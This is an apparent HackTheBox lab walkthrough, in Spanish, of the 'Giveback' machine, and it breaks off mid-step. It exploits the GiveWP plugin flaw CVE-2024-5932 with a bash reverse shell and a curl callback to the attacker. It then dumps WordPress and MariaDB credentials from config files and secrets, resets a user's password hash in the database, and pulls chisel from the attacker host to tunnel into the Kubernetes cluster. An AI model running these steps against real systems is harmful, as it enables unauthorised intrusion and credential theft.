---
hidden: true
icon: flag
---

# Giveback HackTheBox (Intermediate)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 07:43 PST
Nmap scan report for giveback.htb (10.10.11.94)
Host is up (0.055s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
80/tcp    open  http    nginx 1.28.0
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
|_http-server-header: nginx/1.28.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 6.8.1
30686/tcp open  http    Golang net/http server
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Load-Balancing-Endpoint-Weight: 1
|     Date: Sun, 02 Nov 2025 09:15:37 GMT
|     Content-Length: 127
|     "service": {
|     "namespace": "default",
|     "name": "wp-nginx-service"
|     "localEndpoints": 1,
|     "serviceProxyHealthy": true
|   GenericLines, Help, LPDString, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Load-Balancing-Endpoint-Weight: 1
|     Date: Sun, 02 Nov 2025 09:15:19 GMT
|     Content-Length: 127
|     "service": {
|     "namespace": "default",
|     "name": "wp-nginx-service"
|     "localEndpoints": 1,
|_    "serviceProxyHealthy": true
|_http-title: Site doesn't have a title (application/json).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at 
https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port30686-TCP:V=7.95%I=7%D=11/2%Time=69077C42%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,132,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Load-Bal
SF:ancing-Endpoint-Weight:\x201\r\nDate:\x20Sun,\x2002\x20Nov\x202025\x200
SF:9:15:19\x20GMT\r\nContent-Length:\x20127\r\n\r\n{\n\t\"service\":\x20{\
SF:n\t\t\"namespace\":\x20\"default\",\n\t\t\"name\":\x20\"wp-nginx-servic
SF:e\"\n\t},\n\t\"localEndpoints\":\x201,\n\t\"serviceProxyHealthy\":\x20t
SF:rue\n}")%r(HTTPOptions,132,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20
SF:application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Load-Balanc
SF:ing-Endpoint-Weight:\x201\r\nDate:\x20Sun,\x2002\x20Nov\x202025\x2009:1
SF:5:19\x20GMT\r\nContent-Length:\x20127\r\n\r\n{\n\t\"service\":\x20{\n\t
SF:\t\"namespace\":\x20\"default\",\n\t\t\"name\":\x20\"wp-nginx-service\"
SF:\n\t},\n\t\"localEndpoints\":\x201,\n\t\"serviceProxyHealthy\":\x20true
SF:\n}")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,132,"
SF:HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20application/json\r\nX-Conten
SF:t-Type-Options:\x20nosniff\r\nX-Load-Balancing-Endpoint-Weight:\x201\r\
SF:nDate:\x20Sun,\x2002\x20Nov\x202025\x2009:15:37\x20GMT\r\nContent-Lengt
SF:h:\x20127\r\n\r\n{\n\t\"service\":\x20{\n\t\t\"namespace\":\x20\"defaul
SF:t\",\n\t\t\"name\":\x20\"wp-nginx-service\"\n\t},\n\t\"localEndpoints\"
SF::\x201,\n\t\"serviceProxyHealthy\":\x20true\n}")%r(LPDString,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.21 seconds
```

Veremos varios puertos interesantes, entre ellos veremos un puerto `80` que aloja una pagina web y el otro que es `30686` que aloja un `golang server` por lo que vamos a investigar en el puerto `80` a ver que vemos.

Entrando dentro veremos que es un `wordpress`, pero si intentamos entrar en el `wp-admin` nos da un `502 Error` por lo que vemos es inaccesible por alguna regla puesta a nivel de servidor.

Si vemos en el reporte de `nmap` hay un `robots.txt` que si entramos dentro veremos lo siguiente:

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http://10.10.11.94/wp-sitemap.xml
```

Vemos que expone las rutas de `admin` pero no nos dejara entrar dando el error de antes dicho anteriormente, por lo que tendremos que seguir investigando.

Investigando un rato veremos a nivel de codigo la siguiente linea:

```html
<link rel='stylesheet' id='give-styles-css' href='http://giveback.htb/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0' type='text/css' media='all' />
<link rel='stylesheet' id='give-donation-summary-style-frontend-css' href='http://giveback.htb/wp-content/plugins/give/assets/dist/css/give-donation-summary.css?ver=3.14.0' type='text/css' media='all' />
```

Vemos que tiene un `plugin` llamado `give` que este se corresponde a `GiveWP`, tambien vemos que tiene la version `3.14.0` si buscamos informacion sobre dicho `plugin` para ver si tiene una vulnerabilidad en esa version veremos el siguiente `repositorio`.

## CVE-2024-5932 GiveWP

URL = [CVE-2024-5932 GiveWP GitHub PoC](https://github.com/EQSTLab/CVE-2024-5932)

Veremos que hay una vulnerabilidad de las versiones del `plugin` a partir de la `3.14.1` para abajo, por lo que esta version le afecta, ahora informandonos un poco mejor tendremos que ver que `URL` tendremos que pasarle como parametro para que el `exploit` funcione.

Investigando que `URL` seria veremos el siguiente `post` en el que pone un `link` donde pone la palabra `portal`:

<figure><img src="../../.gitbook/assets/Pasted image 20251102104855.png" alt=""><figcaption></figcaption></figure>

Si le damos ahi, nos llevara a una pagina de `donaciones` justo esa pagina es la que nos interesa:

```
URL = http://giveback.htb/donations/the-things-we-need/
```

Ahora sabiendo esto, vamos a ejecutar el `exploit` de esta forma para probarlo:

```shell
git clone https://github.com/EQSTLab/CVE-2024-5932.git
cd CVE-2024-5932/
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python3 CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c "curl http://<IP_ATTACKER>/"
```

Info:

```
                                                                                                                                                                                                                                                                                                            
             ..-+*******-                                                                                  
            .=#+-------=@.                        .:==:.                                                   
           .**-------=*+:                      .-=++.-+=:.                                                 
           +*-------=#=+++++++++=:..          -+:==**=+-+:.                                                
          .%----=+**+=-:::::::::-=+**+:.      ==:=*=-==+=..                                                
          :%--**+-::::::::::::::::::::+*=:     .::*=**=:.                                                  
   ..-++++*@#+-:::::::::::::::::::::::::-*+.    ..-+:.                                                     
 ..+*+---=#+::::::::::::::::::::::::::::::=*:..-==-.                                                       
 .-#=---**:::::::::::::::::::::::::=+++-:::-#:..            :=+++++++==.   ..-======-.     ..:---:..       
  ..=**#=::::::::::::::::::::::::::::::::::::%:.           *@@@@@@@@@@@@:.-#@@@@@@@@@%*:.-*%@@@@@@@%#=.    
   .=#%=::::::::::::::::::::::::::::::::-::::-#.           %@@@@@@@@@@@@+:%@@@@@@@@@@@%==%@@@@@@@@@@@%-    
  .*+*+:::::::::::-=-::::::::::::::::-*#*=::::#: ..*#*+:.  =++++***%@@@@+-@@@#====%@@@%==@@@#++++%@@@%-    
  .+#*-::::::::::+*-::::::::::::::::::+=::::::-#..#+=+*%-.  :=====+#@@@@-=@@@+.  .%@@@%=+@@@+.  .#@@@%-    
   .+*::::::::::::::::::::::::+*******=::::::--@.+@#+==#-. #@@@@@@@@@@@@.=@@@%*++*%@@@%=+@@@#====@@@@%-    
   .=+:::::::::::::=*+::::::-**=-----=#-::::::-@%+=+*%#:. .@@@@@@@@@@@%=.:%@@@@@@@@@@@#-=%@@@@@@@@@@@#-    
   .=*::::::::::::-+**=::::-#+--------+#:::-::#@%*==+*-   .@@@@#=----:.  .-+*#%%%%@@@@#-:+#%@@@@@@@@@#-    
   .-*::::::::::::::::::::=#=---------=#:::::-%+=*#%#-.   .@@@@%######*+.       .-%@@@#:  .....:+@@@@*:    
    :+=:::::::::::-:-::::-%=----------=#:::--%++++=**      %@@@@@@@@@@@@.        =%@@@#.        =@@@@*.    
    .-*-:::::::::::::::::**---------=+#=:::-#**#*+#*.      -#%@@@@@@@@@#.        -%@@%*.        =@@@@+.    
.::-==##**-:::-::::::::::%=-----=+***=::::=##+#=.::         ..::----:::.         .-=--.         .=+=-.     
%+==--:::=*::::::::::::-:+#**+=**=::::::-#%=:-%.                                                           
*+.......+*::::::::::::::::-****-:::::=*=:.++:*=                                                           
.%:..::::*@@*-::::::::::::::-+=:::-+#%-.   .#*#.                                                           
 ++:.....#--#%**=-:::::::::::-+**+=:@#....-+*=.                                                            
 :#:....:#-::%..-*%#++++++%@@@%*+-.#-=#+++-..                                                              
 .++....-#:::%.   .-*+-..*=.+@= .=+..-#                                                                    
 .:+++#@#-:-#= ...   .-++:-%@@=     .:#                                                                    
     :+++**##@#+=.      -%@@@%-   .-=*#.                                                                   
    .=+::+::-@:         #@@@@+. :+*=::=*-                                                                  
    .=+:-**+%%+=-:..    =*#*-..=*-:::::=*                                                                  
     :++---::--=*#+*+++++**+*+**-::::::+=                                                                  
      .+*=:::---+*:::::++++++*+=:::::-*=.                                                                  
       .:=**+====#*::::::=%:...-=++++=.      Author: EQST(Experts, Qualified Security Team)
           ..:----=**++++*+.                 Github: https://github.com/EQSTLab/CVE-2024-5932    

                                                                                                                                                                                                                                                                                                         
Analysis base : https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin/

=============================================================================================================    

CVE-2024-5932 : GiveWP unauthenticated PHP Object Injection
description: The GiveWP  Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.14.1 via deserialization of untrusted input from the 'give_title' parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to execute code remotely, and to delete arbitrary files.
Arbitrary File Deletion

============================================================================================================= 
    
[\] Exploit loading, please wait...
[+] Requested Data: 
{'give-form-id': '17', 'give-form-hash': 'b3147fe398', 'give-price-id': '0', 'give-amount': '$10.00', 'give_first': 'Troy', 'give_last': 'Paul', 'give_email': 'sarahroberts@example.net', 'give_title': 'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:24:"curl http://10.10.15.50/";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}', 'give-gateway': 'offline', 'action': 'give_process_donation'}
```

enviando esto veremos que ha funcionado el `exploit` pero si nos ponemos a la escucha con un servidor de `python3` en nuestra maquina atacante no nos llegara nada, por lo que algo mal estamos haciendo, pero por lo menos sabemos que es `vulnerable`.

Si probamos directamente a realizar una `reverse shell` veremos lo siguiente:

```shell
python3 CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c "bash -c 'bash -i >& /dev/tcp/<IP_ATTACKER>/<PORT> 0>&1'"
```

Antes de enviar el comando vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos el comando, tardara un rato:

```
                                                                                                                                                                                                                                                                                                            
             ..-+*******-                                                                                  
            .=#+-------=@.                        .:==:.                                                   
           .**-------=*+:                      .-=++.-+=:.                                                 
           +*-------=#=+++++++++=:..          -+:==**=+-+:.                                                
          .%----=+**+=-:::::::::-=+**+:.      ==:=*=-==+=..                                                
          :%--**+-::::::::::::::::::::+*=:     .::*=**=:.                                                  
   ..-++++*@#+-:::::::::::::::::::::::::-*+.    ..-+:.                                                     
 ..+*+---=#+::::::::::::::::::::::::::::::=*:..-==-.                                                       
 .-#=---**:::::::::::::::::::::::::=+++-:::-#:..            :=+++++++==.   ..-======-.     ..:---:..       
  ..=**#=::::::::::::::::::::::::::::::::::::%:.           *@@@@@@@@@@@@:.-#@@@@@@@@@%*:.-*%@@@@@@@%#=.    
   .=#%=::::::::::::::::::::::::::::::::-::::-#.           %@@@@@@@@@@@@+:%@@@@@@@@@@@%==%@@@@@@@@@@@%-    
  .*+*+:::::::::::-=-::::::::::::::::-*#*=::::#: ..*#*+:.  =++++***%@@@@+-@@@#====%@@@%==@@@#++++%@@@%-    
  .+#*-::::::::::+*-::::::::::::::::::+=::::::-#..#+=+*%-.  :=====+#@@@@-=@@@+.  .%@@@%=+@@@+.  .#@@@%-    
   .+*::::::::::::::::::::::::+*******=::::::--@.+@#+==#-. #@@@@@@@@@@@@.=@@@%*++*%@@@%=+@@@#====@@@@%-    
   .=+:::::::::::::=*+::::::-**=-----=#-::::::-@%+=+*%#:. .@@@@@@@@@@@%=.:%@@@@@@@@@@@#-=%@@@@@@@@@@@#-    
   .=*::::::::::::-+**=::::-#+--------+#:::-::#@%*==+*-   .@@@@#=----:.  .-+*#%%%%@@@@#-:+#%@@@@@@@@@#-    
   .-*::::::::::::::::::::=#=---------=#:::::-%+=*#%#-.   .@@@@%######*+.       .-%@@@#:  .....:+@@@@*:    
    :+=:::::::::::-:-::::-%=----------=#:::--%++++=**      %@@@@@@@@@@@@.        =%@@@#.        =@@@@*.    
    .-*-:::::::::::::::::**---------=+#=:::-#**#*+#*.      -#%@@@@@@@@@#.        -%@@%*.        =@@@@+.    
.::-==##**-:::-::::::::::%=-----=+***=::::=##+#=.::         ..::----:::.         .-=--.         .=+=-.     
%+==--:::=*::::::::::::-:+#**+=**=::::::-#%=:-%.                                                           
*+.......+*::::::::::::::::-****-:::::=*=:.++:*=                                                           
.%:..::::*@@*-::::::::::::::-+=:::-+#%-.   .#*#.                                                           
 ++:.....#--#%**=-:::::::::::-+**+=:@#....-+*=.                                                            
 :#:....:#-::%..-*%#++++++%@@@%*+-.#-=#+++-..                                                              
 .++....-#:::%.   .-*+-..*=.+@= .=+..-#                                                                    
 .:+++#@#-:-#= ...   .-++:-%@@=     .:#                                                                    
     :+++**##@#+=.      -%@@@%-   .-=*#.                                                                   
    .=+::+::-@:         #@@@@+. :+*=::=*-                                                                  
    .=+:-**+%%+=-:..    =*#*-..=*-:::::=*                                                                  
     :++---::--=*#+*+++++**+*+**-::::::+=                                                                  
      .+*=:::---+*:::::++++++*+=:::::-*=.                                                                  
       .:=**+====#*::::::=%:...-=++++=.      Author: EQST(Experts, Qualified Security Team)
           ..:----=**++++*+.                 Github: https://github.com/EQSTLab/CVE-2024-5932    

                                                                                                                                                                                                                                                                                                         
Analysis base : https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin/

=============================================================================================================    

CVE-2024-5932 : GiveWP unauthenticated PHP Object Injection
description: The GiveWP  Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.14.1 via deserialization of untrusted input from the 'give_title' parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to execute code remotely, and to delete arbitrary files.
Arbitrary File Deletion

============================================================================================================= 
    
[\] Exploit loading, please wait...
[+] Requested Data: 
{'give-form-id': '17', 'give-form-hash': 'b3147fe398', 'give-price-id': '0', 'give-amount': '$10.00', 'give_first': 'Xavier', 'give_last': 'Fleming', 'give_email': 'shellymartin@example.net', 'give_title': 'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:51:"bash -c \'bash -i >& /dev/tcp/10.10.15.50/7777 0>&1\'";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}', 'give-gateway': 'offline', 'action': 'give_process_donation'}
```

Esto veremos que se quedara pensando y si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.15.50] from (UNKNOWN) [10.10.11.94] 49831
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
<-6cb597974c-2wkp5:/opt/bitnami/wordpress/wp-admin$
```

Vemos que ha funcionado, por lo que vamos a sanitizar la `shell` de esta forma:

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Kubernete (Clúster)

Ahora si investigamos un poco veremos que efectivamente estamos en un contenedor (`kubernete`), por lo que tendremos que escapar de aqui.

Si probamos a bsucar credenciales de `wordpress` veremos lo siguiente:

```shell
cat /opt/bitnami/wordpress/wp-config.php | grep -E "DB_USER|DB_PASSWORD|DB_HOST|DB_NAME"
```

Info:

```
define( 'DB_NAME', 'bitnami_wordpress' );
define( 'DB_USER', 'bn_wordpress' );
define( 'DB_PASSWORD', 'sW5sp4spa3u7RLyetrekE4oS' );
define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );
```

Vemos que funciona, pero recordemos que no podemos entrar al `login` de `wordpress`, si empezamos a explorar en la `DDBB` con estas credenciales, veremos esta informacion:

```shell
mysql -u bn_wordpress -psW5sp4spa3u7RLyetrekE4oS -h beta-vino-wp-mariadb bitnami_wordpress -e "SELECT user_login, user_pass, user_email FROM wp_users;"
```

Info:

```
mysql: Deprecated program name. It will be removed in a future release, use '/opt/bitnami/mysql/bin/mariadb' instead
+------------+------------------------------------+------------------+
| user_login | user_pass                          | user_email       |
+------------+------------------------------------+------------------+
| user       | $P$Bm1D6gJHKylnyyTeT0oYNGKpib//vP. | user@example.com |
+------------+------------------------------------+------------------+
```

Vemos que hay un usuario pero en esta parte nada interesante, ahora vamos a realizar una busqueda un poco mas intensiva para ver posibles `logs` o credenciales que se hayan utilizado buscando un poco mas a fondo.

```shell
mysql -u bn_wordpress -psW5sp4spa3u7RLyetrekE4oS -h beta-vino-wp-mariadb bitnami_wordpress -e "SELECT option_name, option_value FROM wp_options WHERE option_name LIKE '%admin%' OR option_name LIKE '%key%' OR option_name LIKE '%secret%';"
```

Info:

```
mysql: Deprecated program name. It will be removed in a future release, use '/opt/bitnami/mysql/bin/mariadb' instead
+----------------------+----------------------------------------------------------------------------------------------------------+
| option_name          | option_value                                                                                             |
+----------------------+----------------------------------------------------------------------------------------------------------+
| admin_email          | user@example.com                                                                                         |
| moderation_keys      |                                                                                                          |
| admin_email_lifespan | 1757779739                                                                                               |
| disallowed_keys      |                                                                                                          |
| recovery_keys        | a:0:{}                                                                                                   |
| new_admin_email      | bbbbbbbwyrm@giveback.htb                                                                                 |
| adminhash            | a:2:{s:4:"hash";s:32:"6ca3aebea9ee4889ef164aa2f96c6823";s:8:"newemail";s:24:"bbbbbbbwyrm@giveback.htb";} |
+----------------------+----------------------------------------------------------------------------------------------------------+
```

Veremos varias cosas interesantes un `email` de un `admin` y un `hash MD5` asociado a dicho `email`.

Si probamos a obtener mas informacion de las `DDBBs` veremos esto:

```shell
mysql -u bn_wordpress -psW5sp4spa3u7RLyetrekE4oS -h beta-vino-wp-mariadb bitnami_wordpress -e "SELECT * FROM wp_give_donors;"
mysql -u bn_wordpress -psW5sp4spa3u7RLyetrekE4oS -h beta-vino-wp-mariadb bitnami_wordpress -e "SELECT * FROM wp_give_donationmeta WHERE meta_key LIKE '%email%' OR meta_value LIKE '%wyrm%';"
```

De toda la informacion que suelta vemos que el usuario `babywyrm` realizo multiples donaciones, por lo que podemos suponer que puede ser un usuario a nivel de sistema, pero si probamos con las credenciales que tenemos hasta ahora encontradas por `SSH` no va a funcionar, por lo que tendremos que seguir buscando.

Si ponemos el comando `env` para ver las variables...

```shell
env
```

Veremos mucha informacion, pero entre toda esa informacion, vemos esta otra contraseña:

```
................................<RESTO DE INFO>....................................
WORDPRESS_USERNAME=user
WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS
APACHE_HTDOCS_DIR=/opt/bitnami/apache/htdocs
BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
WEB_SERVER_GROUP=daemon
WORDPRESS_PASSWORD=O8F7KR5zGi
................................<RESTO DE INFO>....................................
```

Vemos que es la contraseña de `user` aparentemente del `wordpress` si probamos acceder con el `dominio` en vez de con la `IP` veremos que si nos deja entrar en el `wp-admin` de esta forma:

```
URL = http://giveback.htb/wp-admin/
```

Info:

<figure><img src="../../.gitbook/assets/Pasted image 20251102112622.png" alt=""><figcaption></figcaption></figure>

Ahora vamos a probar a meter las credenciales del `user` que encontramos anteriormente:

```
User: user
Pass: O8F7KR5zGi
```

Pero veremos que no nos deja, son incorrectas, aunque el usuario si esta registrado en la pagina.

Vamos a probar a modificar la contraseña de `user` desde la `DDBB` de esta forma:

```shell
cd /opt/bitnami/wordpress
php -r "
require_once('wp-includes/class-phpass.php');
\$wp_hasher = new PasswordHash(8, true);
\$hash = \$wp_hasher->HashPassword('nuevapassword123');
echo 'Hash: ' . \$hash . \"\n\";
echo 'Length: ' . strlen(\$hash) . \"\n\";
"
```

Info:

```
Hash: $P$Bi8gSpZrZopjwZ4mKYGrlprvVIh6BM0
Length: 34
```

Ahora vamos actualizar al usuario `user` con esa nueva contraseña.

```shell
mysql -u bn_wordpress -psW5sp4spa3u7RLyetrekE4oS -h beta-vino-wp-mariadb bitnami_wordpress -e "UPDATE wp_users SET user_pass = '\$P\$Bi8gSpZrZopjwZ4mKYGrlprvVIh6BM0' WHERE user_login = 'user';"
```

Hecho esto vamos a probar a meter las siguiente credenciales:

```
User: user
Pass: nuevapassword123
```

Info:

<figure><img src="../../.gitbook/assets/Pasted image 20251102120020.png" alt=""><figcaption></figcaption></figure>

Veremos que ha funcionado, pero si hacemos una `reverse shell` con el truco de `Appearance -> Theme File Editor -> functions.php` metiendo un codigo de una `reverse shell` en `PHP` si obtendremos acceso, pero al mismo `kubernete` que antes, por lo que no nos sirve de mucho este acceso.

Dentro de la limitaciones que tenemos en la `shell` vamos a probar a intentar obtener el `LEGACY_INTRANET` de iformacion:

```shell
exec 3<>/dev/tcp/10.43.2.241/5000
echo -e "GET / HTTP/1.0\r\n\r\n" >&3
cat <&3
exec 3>&-
```

Info:

```html
HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: Sun, 02 Nov 2025 11:40:50 GMT
Content-Type: text/html; charset=UTF-8
Connection: close

<!DOCTYPE html>
<html>
<head>
  <title>GiveBack LLC Internal CMS</title>
  <!-- Developer note: phpinfo accessible via debug mode during migration window -->
  <style>
    body { font-family: Arial, sans-serif; margin: 40px; background: #f9f9f9; }
    .header { color: #333; border-bottom: 1px solid #ccc; padding-bottom: 10px; }
    .info { background: #eef; padding: 15px; margin: 20px 0; border-radius: 5px; }
    .warning { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; margin: 10px 0; }
    .resources { margin: 20px 0; }
    .resources li { margin: 5px 0; }
    a { color: #007bff; text-decoration: none; }
    a:hover { text-decoration: underline; }
  </style>
</head>
<body>
  <div class="header">
    <h1>🏢 GiveBack LLC Internal CMS System</h1>
    <p><em>Development Environment – Internal Use Only</em></p>
  </div>

  <div class="warning">
    <h4>⚠️ Legacy Notice</h4>
    <p>**SRE** - This system still includes legacy CGI support. Cluster misconfiguration may likely expose internal scripts.</p>
  </div>

  <div class="resources">
    <h3>Internal Resources</h3>
    <ul>
      <li><a href="/admin/">/admin/</a> — VPN Required</li>
      <li><a href="/backups/">/backups/</a> — VPN Required</li>
      <li><a href="/runbooks/">/runbooks/</a> — VPN Required</li>
      <li><a href="/legacy-docs/">/legacy-docs/</a> — VPN Required</li>
      <li><a href="/debug/">/debug/</a> — Disabled</li>
      <li><a href="/cgi-bin/info">/cgi-bin/info</a> — CGI Diagnostics</li>
      <li><a href="/cgi-bin/php-cgi">/cgi-bin/php-cgi</a> — PHP-CGI Handler</li>
      <li><a href="/phpinfo.php">/phpinfo.php</a></li>
      <li><a href="/robots.txt">/robots.txt</a> — Crawlers: Disallowed</li>
    </ul>
  </div>

  <div class="info">
    <h3>Developer Note</h3>
    <p>This CMS was originally deployed on Windows IIS using <code>php-cgi.exe</code>.
    During migration to Linux, the Windows-style CGI handling was retained to ensure
    legacy scripts continued to function without modification.</p>
  </div>
</body>
</html>
```

Veremos que funciona pudimos obtener informacion, pero nada interesante, si buscamos algun secreto del propio `kubernete`...

```shell
ls -la /secrets/ 2>/dev/null
```

Info:

```
total 4
drwxrwsrwt 3 root 1001  140 Nov  2 11:46 .
drwxr-xr-x 1 root root 4096 Nov  2 12:03 ..
drwxr-sr-x 2 root 1001  100 Nov  2 11:46 ..2025_11_02_11_46_38.117554198
lrwxrwxrwx 1 root 1001   31 Nov  2 11:46 ..data -> ..2025_11_02_11_46_38.117554198
lrwxrwxrwx 1 root 1001   23 Nov  2 11:46 mariadb-password -> ..data/mariadb-password
lrwxrwxrwx 1 root 1001   28 Nov  2 11:46 mariadb-root-password -> ..data/mariadb-root-password
lrwxrwxrwx 1 root 1001   25 Nov  2 11:46 wordpress-password -> ..data/wordpress-password
```

Vemos cosas interesantes, entre ellas el archivo:

```shell
cat /secrets/mariadb-root-password
```

Info:

```
sW5sp4syetre32828383kE4oSI
```

Si la probamos en la `DDBB` funcionara, pero no veremos nada interesante y tampoco se podra reutilizar en ningun sitio.

Vamos a volver donde encontramos en la `IP` de `10.43.2.241` el puerto `5000` en el que vimos en la informacion que tiene `php-cgi` por lo que podemos jugar con esto, pero para ello vamos a `tunelizar` dicho puerto de la `IP` a nuestra maquina atacante, antes nos tendremos que pasar el binario `chisel` de esta forma:

```php
download_php() {
     local url="$1"
     local output="${2:-}"
     
     if [ -z "$output" ]; then
         output=$(basename "$url")
     fi
     
     php -r "
     \$url = '$url';
     \$output = '$output';
     \$content = file_get_contents(\$url);
     if (\$content === false) {
         echo 'Error: No se pudo descargar el archivo\\n';
         exit(1);
     }
     if (file_put_contents(\$output, \$content) === false) {
         echo 'Error: No se pudo guardar el archivo\\n';
         exit(1);
     }
     echo 'Descargado: ' . \$output . '\\n';
     "
 }
```

Una vez que hayamos declarado esta funcion, vamos a utilizarla para pasarnos nuestro archivo `chisel` de esta forma:

```shell
wget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_amd64.gz
gzip -d chisel_1.11.3_linux_amd64.gz
mv chisel_1.11.3_linux_amd64 chisel
python3 -m http.server 80
```

Ahora desde la maquina victima ejecutaremos lo siguiente:

```shell
download_php "http://<IP_ATTACKER>/chisel" "/tmp/chisel"
```

Info:

```
Descargado: /tmp/chisel
```

Veremos que ha funcionado, por lo que vamos a tunelizar el puerto `5000` de la `IP: 10.43.2.241` que hemos encontrado antes el cual era bastante interesante.

En nuestra maquina atacante:

```shell
./chisel server -p 8888 --reverse
```

Ahora en la maquina victima:

```shell
cd /tmp
./chisel client <IP_ATTACKER>:8888 R:5000:10.43.2.241:5000
```

Hecho esto en la maquina atacante veremos:

```
2025/11/02 14:35:21 server: Reverse tunnelling enabled
2025/11/02 14:35:21 server: Fingerprint pmfzCe+ytz6uCA7j9xTS0gyKwMXwdtUugQfWQUXn/EQ=
2025/11/02 14:35:21 server: Listening on http://0.0.0.0:8888
2025/11/02 14:35:34 server: session#1: tun: proxy#R:5000=>10.43.2.241:5000: Listening
```

Y en la victima:

```
